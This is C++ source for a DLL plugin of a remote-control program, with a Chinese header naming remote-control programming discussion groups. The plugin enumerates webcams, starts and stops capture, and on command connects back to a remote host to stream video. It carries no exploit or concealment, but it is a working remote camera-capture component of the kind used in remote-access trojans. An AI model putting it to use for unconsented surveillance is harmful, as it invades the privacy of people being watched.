/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

// tcapdll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "tcapdll.h"
#include "capturevideo.h"
#include "../../kms/km_head.h"

typedef struct tag_cap_screen_ver{
    unsigned short wVersion;
    unsigned short wSystemVersion;
    unsigned long c_type;
    unsigned short  iWidth;
    unsigned short  iHeight;
}cap_screen_ver,*pcap_screen_ver;


CCaptureVideo g_cap;
pshare_main g_share_main = NULL;
cap_screen_ver g_cap_screen_ver;
u_long crc32;
int devid = 0;

int kms_main_enum_cap(pio_socket i_socket, char *buffer, int length);
int kms_main_start_cap(pio_socket i_socket, char *buffer, int length);
int kms_main_stop_cap(pio_socket i_socket, char *buffer, int length);

kms_event_func cap_event_funcs[] = {
    kms_main_enum_cap,
	kms_main_start_cap,
	kms_main_stop_cap
};

int
kms_main_enum_cap(pio_socket i_socket, char *buffer, int length)
{
	char buff[4096] = {0};
	int len = 0;
	int i = 10;

    pio_data_header pi_data_header = (pio_data_header)buffer;

	for (i =0; i < 10; i++) {
		len = g_cap.EnumDevices(buff);
		if (len != -1)
			break;
	}

	k_sock_send(i_socket, 4, 1, 0, buff, strlen(buff));

	printf("%s:%s:%d\n", "kms_main_enum_cap", buff, i);
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_start_cap(pio_socket i_socket, char *buffer, int length)
{
	int i =0;
    pio_data_header pi_data_header = (pio_data_header)buffer;

	for (i =0; i < 10; i++) {
		if (g_cap.Init(devid, i_socket, NULL, NULL, 320, 240) != S_OK) {
			g_cap.stop();
			printf("%s:%d\n", "kms_main_cmd:kms_main_start_cap errorrrrrrr", devid);
		} else {
			break;
		}
	}
	
	printf("%s:%d:%d\n", "kms_main_cmd:kms_main_start_cap", devid, i);
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_stop_cap(pio_socket i_socket, char *buffer, int length)
{
    //pio_data_header pi_data_header = (pio_data_header)buffer;
	g_cap.stop();
	printf("%s\n", "kms_main_cmd:kms_main_stop_cap");
    return SOCK_LOOP_CLOSE;
}


int
km_main_connect(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped)
{
    if (ret == 0) {
        return SOCK_LOOP_CLOSE;
    }
	i_socket->f_call_work = (void*)g_share_main->s_func.kms_func[6];
    
    i_socket->i_length = 4096000;
	i_socket->i_buffer = (char*)malloc(i_socket->i_length);

    k_sock_send(i_socket, 0, 0, crc32, (char*)&g_cap_screen_ver, sizeof(cap_screen_ver));

    return SOCK_LOOP_RECV_HEADER;
}

int kms_main_close(pio_socket i_socket)
{
	g_cap.stop();
	printf("%s:%s\n", "kms_main_cap", "kms_main_close");
	free(i_socket->i_buffer);
    return 0;
}

int
kms_main_cap(pio_socket i_socket, char *buffer, int length)
{
	char *data_buffer = buffer + sizeof(io_data_header);
    pio_data_header pi_data_header = (pio_data_header)buffer;
    printf("%s\n", "kms_main_cap");

	crc32 = pi_data_header->crc32;
	devid = (int)*data_buffer;

    if (!k_sock_connect(g_share_main->remote_addr, g_share_main->remote_port, km_main_connect, kms_main_close, NULL)) {
        printf("%s\n", "k_sock_ret_connect error");
    }
    return SOCK_LOOP_RECV_HEADER;
}

kms_event_func event_funcs[] = {
	kms_main_enum_cap,
    kms_main_cap,
};


extern "C" int __declspec(dllexport) initialize(pshare_main ps_main)
{
    g_share_main = ps_main;
    g_share_main->event_funcs[4].event_funcs = event_funcs;
    g_share_main->event_funcs[4].count = 2;

	g_share_main->event_funcs[5].event_funcs = cap_event_funcs;
    g_share_main->event_funcs[5].count = 3;

	g_cap_screen_ver.wVersion = 0x1003; 
    g_cap_screen_ver.wSystemVersion = 0;
    g_cap_screen_ver.c_type = C_CAP_SCREEN;
    g_cap_screen_ver.iWidth  = 320;
    g_cap_screen_ver.iHeight  = 240;

	printf("%s\n", "cap initialize");
    return 0;
}


// This is the constructor of a class that has been exported.
// see tcapdll.h for the class definition
Ctcapdll::Ctcapdll()
{
	return;
}
